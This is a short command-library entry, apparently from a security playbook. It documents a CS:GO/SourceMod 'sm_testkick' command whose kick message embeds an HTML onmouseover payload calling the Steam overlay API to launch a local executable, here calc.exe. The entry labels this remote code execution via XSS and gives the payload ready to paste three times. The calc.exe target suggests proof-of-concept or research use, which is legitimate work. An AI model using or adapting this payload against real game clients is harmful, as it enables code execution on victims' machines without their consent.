---
data: >-
  sm_testkick <a
  onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The
  remote host stopped receiving communications and closed the connection</a>
tags:
  - csgo
  - rce
  - xss
type: command
executor: bash
platforms:
  - Windows
  - 'CS:GO'
id: 0ffb570c-fb54-45aa-9497-20c3d5980e0b
created_at: '2025-12-14T00:11:25.209Z'
updated_at: '2025-12-14T00:11:25.209Z'
verified: false
validated: true
submitted: true
---
# Sm Testkick with RCE Payload

## Command

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

## Description

Triggers a kick using the testkick plugin with XSS payload to execute JS on mouseover, opening calc.exe.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sm_testkick message` | Contains <a> tag with onmouseover event | Yes |

## Examples

### Basic Usage

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

## Expected Output

Opens Windows Calculator on victim's machine when moused over.

## Related

- [[procedures/Setup-Dedicated-Server-and-Test-Remote-Kick]]
